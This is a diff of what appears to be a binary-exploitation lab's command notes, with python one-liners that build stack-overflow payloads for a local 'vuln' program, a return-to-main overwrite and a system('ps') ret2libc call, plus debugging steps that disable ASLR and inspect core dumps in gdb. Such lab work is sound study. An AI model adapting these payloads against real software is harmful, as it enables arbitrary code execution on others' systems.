@@ -1,11 +1,12 @@
 python3 -c 'import sys; sys.stdout.buffer.write(b"A"*44 + b"\x70\x90\x04\x08")' > attack48system.txt # ret 2 main
 
-python3 -c 'import sys; sys.stdout.buffer.write(b"ps\x00" + b"A"*41 + b"\x70\x90\x04\x08" + b"B"*4 + b"\x40\xc0\x04\x08")' > attack48system.txt # system() with argument "ps" in global and "BBBB" as return adress
+python3 -c 'import sys; sys.stdout.buffer.write(b"ps\x00" + b"A"*41 + b"\x70\x90\x04\x08" + b"B"*4 + b"\x40\xc0\x04\x08")' > attack48system.txt # system() with argument "ps" in global and "BBBB" as return adress (first argument after entering to system() function)
 
 # debug:
+sudo sysctl -w kernel.core_pattern=core # run only once in console
 ulimit -c unlimited
-(python3 exploit_shellcode.py 0xffffce00 10; cat ) | setarch x86_64 -R ./vuln
-./vuln core
+(python3 exploit_shellcode.py 0xffffce00 10; cat) | setarch i386 -R ./vuln
+gdb vuln core
 info register esp
 x/100xw $esp-64
 
